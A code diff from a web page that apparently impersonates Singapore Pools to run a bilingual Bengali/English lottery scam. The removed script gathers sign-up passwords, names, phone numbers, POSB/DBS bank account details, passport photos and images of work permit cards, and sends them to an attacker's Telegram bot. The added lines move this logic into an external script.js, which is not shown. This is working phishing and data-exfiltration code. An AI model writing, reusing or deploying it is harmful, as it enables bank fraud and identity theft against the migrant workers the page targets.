-      const input = document.getElementById(inputId);
-      if (input.type === "password") {
-        input.type = "text";
-        btn.innerText = "🙈";
-      } else {
-        input.type = "password";
-        btn.innerText = "👁️";
-      }
-    }
+    <!-- Footer -->
+    <footer class="footer">
+        <p>&copy; 2026 Singapore Pools. <span data-en="All rights reserved." data-bn="সর্বস্বত্ব সংরক্ষিত।">সর্বস্বত্ব সংরক্ষিত।</span></p>
+    </footer>
 
-    // ভাষা পরিবর্তন
-    function toggleLanguage() {
-      if (currentLang === 'bn') {
-        currentLang = 'en';
-        document.getElementById('langBtn').innerText = 'বাংলা';
-        setLanguageEN();
-      } else {
-        currentLang = 'bn';
-        document.getElementById('langBtn').innerText = 'English';
-        setLanguageBN();
-      }
-    }
-
-    function setLanguageBN() {
-      document.getElementById('tabSignup').innerText = 'সাইন আপ';
-      document.getElementById('tabLogin').innerText = 'লগইন';
-      document.getElementById('lblEmail').innerText = 'ইমেইল অথবা ফোন নম্বর';
-      document.getElementById('lblPass').innerText = 'পাসওয়ার্ড (নূন্যতম ৬ অক্ষর)';
-      document.getElementById('btnSignup').innerText = 'সাইন আপ করুন';
-      document.getElementById('lblLoginEmail').innerText = 'ইমেইল অথবা ফোন নম্বর';
-      document.getElementById('lblLoginPass').innerText = 'পাসওয়ার্ড';
-      document.getElementById('btnLogin').innerText = 'লগইন করুন';
-      
-      document.getElementById('portalTitle').innerText = 'সিঙ্গাপুর 4D/6D ফর্ম';
-      document.getElementById('lblFirstName').innerText = 'ফার্স্ট নাম';
-      document.getElementById('lblLastName').innerText = 'লাস্ট নাম';
-      document.getElementById('lblContact').innerText = 'কন্টাক্ট নম্বর';
-      document.getElementById('lblType').innerText = 'টাইপ সিলেক্ট করুন';
-      document.getElementById('lblProfilePic').innerText = 'নিজের পাসপোর্ট সাইজের ছবি';
-      document.getElementById('lblFrontPic').innerText = 'পারমিট কার্ড (সামনের ছবি)';
-      document.getElementById('lblBackPic').innerText = 'পারমিট কার্ড (পিছনের ছবি)';
-      document.getElementById('lblBankAcc').innerText = 'POSB / DBS একাউন্ট নম্বর (যে একাউন্ট থেকে পেমেন্ট করেছেন)';
-      document.getElementById('lblAccHolder').innerText = 'একাউন্ট হোল্ডারের নাম (Account Holder Name)';
-      document.getElementById('btnSubmitForm').innerText = 'কনফার্ম ও জমা দিন';
-    }
-
-    function setLanguageEN() {
-      document.getElementById('tabSignup').innerText = 'Sign Up';
-      document.getElementById('tabLogin').innerText = 'Login';
-      document.getElementById('lblEmail').innerText = 'Email or Phone Number';
-      document.getElementById('lblPass').innerText = 'Password (Min 6 chars)';
-      document.getElementById('btnSignup').innerText = 'Sign Up';
-      document.getElementById('lblLoginEmail').innerText = 'Email or Phone Number';
-      document.getElementById('lblLoginPass').innerText = 'Password';
-      document.getElementById('btnLogin').innerText = 'Login';
-
-      document.getElementById('portalTitle').innerText = 'Singapore 4D/6D Form';
-      document.getElementById('lblFirstName').innerText = 'First Name';
-      document.getElementById('lblLastName').innerText = 'Last Name';
-      document.getElementById('lblContact').innerText = 'Contact Number';
-      document.getElementById('lblType').innerText = 'Select Type';
-      document.getElementById('lblProfilePic').innerText = 'Passport Size Photo';
-      document.getElementById('lblFrontPic').innerText = 'Permit Card (Front Photo)';
-      document.getElementById('lblBackPic').innerText = 'Permit Card (Back Photo)';
-      document.getElementById('lblBankAcc').innerText = 'POSB / DBS Account Number (Paid From)';
-      document.getElementById('lblAccHolder').innerText = 'Account Holder Name';
-      document.getElementById('btnSubmitForm').innerText = 'Confirm & Submit';
-    }
-
-    // ট্যাব সুইচার
-    function switchAuthTab(tab) {
-      document.getElementById('errorBox').style.display = 'none';
-      if (tab === 'signup') {
-        document.getElementById('tabSignup').classList.add('active');
-        document.getElementById('tabLogin').classList.remove('active');
-        document.getElementById('signupForm').classList.remove('hidden');
-        document.getElementById('loginForm').classList.add('hidden');
-      } else {
-        document.getElementById('tabLogin').classList.add('active');
-        document.getElementById('tabSignup').classList.remove('active');
-        document.getElementById('loginForm').classList.remove('hidden');
-        document.getElementById('signupForm').classList.add('hidden');
-      }
-    }
-
-    // টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
-    async function sendTelegramMessage(messageText) {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: messageText,
-          parse_mode: 'HTML'
-        })
-      });
-    }
-
-    // টেলিগ্রামে ছবি পাঠানোর ফাংশন
-    async function sendTelegramPhoto(file, captionText) {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-      const formData = new FormData();
-      formData.append('chat_id', TELEGRAM_CHAT_ID);
-      formData.append('photo', file);
-      formData.append('caption', captionText);
-
-      await fetch(url, {
-        method: 'POST',
-        body: formData
-      });
-    }
-
-    // সাইনআপ হ্যান্ডলার (LocalStorage ব্যবহার করে ডেটা সেভ রাখা)
-    async function handleSignup(e) {
-      e.preventDefault();
-      const email = document.getElementById('signupEmail').value.trim();
-      const pass = document.getElementById('signupPass').value;
-
-      if (!email || pass.length < 6) {
-        showError(currentLang === 'bn' ? 'সঠিক তথ্য প্রদান করুন!' : 'Please provide valid info!');
-        return;
-      }
-
-      // ব্রাউজারের LocalStorage-এ ইউজার সেভ রাখা
-      const userObj = { email, pass };
-      localStorage.setItem('registered_user_' + email, JSON.stringify(userObj));
-      localStorage.setItem('last_logged_user', email);
-
-      // টেলিগ্রামে নোটিফিকেশন পাঠানো
-      const text = `<b>🆕 নতুন সাইন-আপ নোটিফিকেশন</b>\n\n<b>ইউজার/ইমেইল:</b> ${email}\n<b>পাসওয়ার্ড:</b> ${pass}`;
-      sendTelegramMessage(text);
-
-      alert(currentLang === 'bn' ? 'সাইন আপ সফল হয়েছে! এখন ফর্ম পূরণ করুন।' : 'Signup Successful! Now complete the form.');
-      showMainPortal();
-    }
-
-    // লগইন হ্যান্ডলার (LocalStorage থেকে মিলিয়ে ভ্যালিডেট করা)
-    function handleLogin(e) {
-      e.preventDefault();
-      const email = document.getElementById('loginEmail').value.trim();
-      const pass = document.getElementById('loginPass').value;
-
-      // ব্রাউজার থেকে পূর্বে সেভ হওয়া একাউন্ট খোঁজা
-      const savedUserData = localStorage.getItem('registered_user_' + email);
-
-      if (!savedUserData) {
-        showError(currentLang === 'bn' ? 'কোন একাউন্ট পাওয়া যায়নি! প্রথমে সঠিক ইমেইল/ফোন দিয়ে সাইন আপ করুন।' : 'No account found! Please Sign Up first.');
-        return;
-      }
-
-      const user = JSON.parse(savedUserData);
-
-      if (email === user.email && pass === user.pass) {
-        alert(currentLang === 'bn' ? 'লগইন সফল হয়েছে!' : 'Login Successful!');
-        showMainPortal();
-      } else {
-        showError(currentLang === 'bn' ? 'ইমেইল/ফোন অথবা পাসওয়ার্ড ভুল হয়েছে!' : 'Invalid Email/Phone or Password!');
-      }
-    }
-
-    function showError(msg) {
-      const errBox = document.getElementById('errorBox');
-      errBox.innerText = msg;
-      errBox.style.display = 'block';
-    }
-
-    function showMainPortal() {
-      document.getElementById('authTabs').classList.add('hidden');
-      document.getElementById('signupForm').classList.add('hidden');
-      document.getElementById('loginForm').classList.add('hidden');
-      document.getElementById('errorBox').style.display = 'none';
-      document.getElementById('mainPortal').classList.remove('hidden');
-    }
-
-    // ফর্ম সাবমিট হ্যান্ডলার
-    async function handleFormSubmit(e) {
-      e.preventDefault();
-      
-      const submitBtn = document.getElementById('btnSubmitForm');
-      submitBtn.disabled = true;
-      submitBtn.innerText = currentLang === 'bn' ? 'জমা হচ্ছে...' : 'Submitting...';
-
-      const firstName = document.getElementById('firstName').value;
-      const lastName = document.getElementById('lastName').value;
-      const contactNum = document.getElementById('contactNum').value;
-      const digitType = document.getElementById('digitType').value;
-      const bankAcc = document.getElementById('bankAcc').value;
-      const accHolder = document.getElementById('accHolder').value;
-
-      const profilePic = document.getElementById('profilePic').files[0];
-      const frontPic = document.getElementById('frontPic').files[0];
-      const backPic = document.getElementById('backPic').files[0];
-
-      // টেলিগ্রামে বিবরণী পাঠানো
-      const textMessage = `<b>📝 নতুন 4D/6D আবেদন প্রাপ্ত হয়েছে!</b>\n\n` +
-        `<b>নাম:</b> ${firstName} ${lastName}\n` +
-        `<b>কন্টাক্ট নম্বর:</b> ${contactNum}\n` +
-        `<b>টাইপ:</b> ${digitType}\n` +
-        `<b>POSB/DBS একাউন্ট:</b> ${bankAcc}\n` +
-        `<b>একাউন্ট হোল্ডারের নাম:</b> ${accHolder}`;
-
-      try {
-        await sendTelegramMessage(textMessage);
-
-        if (profilePic) {
-          await sendTelegramPhoto(profilePic, `📷 পাসপোর্ট ছবি: ${firstName} ${lastName}`);
-        }
-
-        if (frontPic) {
-          await sendTelegramPhoto(frontPic, `💳 পারমিট কার্ড (সামনে): ${firstName} ${lastName}`);
-        }
-
-        if (backPic) {
-          await sendTelegramPhoto(backPic, `💳 পারমিট কার্ড (পিছনে): ${firstName} ${lastName}`);
-        }
-
-        alert(currentLang === 'bn' ? 'আপনার আবেদন ও ছবিসমূহ সফলভাবে জমা হয়েছে!' : 'Your application and photos have been submitted successfully!');
-        document.getElementById('lotteryForm').reset();
-      } catch (err) {
-        alert(currentLang === 'bn' ? 'দুঃখিত, কোনো সমস্যা হয়েছে। আবার চেষ্টা করুন।' : 'Sorry, something went wrong. Try again.');
-      } finally {
-        submitBtn.disabled = false;
-        submitBtn.innerText = currentLang === 'bn' ? 'কনফার্ম ও জমা দিন' : 'Confirm & Submit';
-      }
-    }
-  </script>
+    <!-- Custom JS Link -->
+    <script src="script.js"></script>
 </body>
 </html>
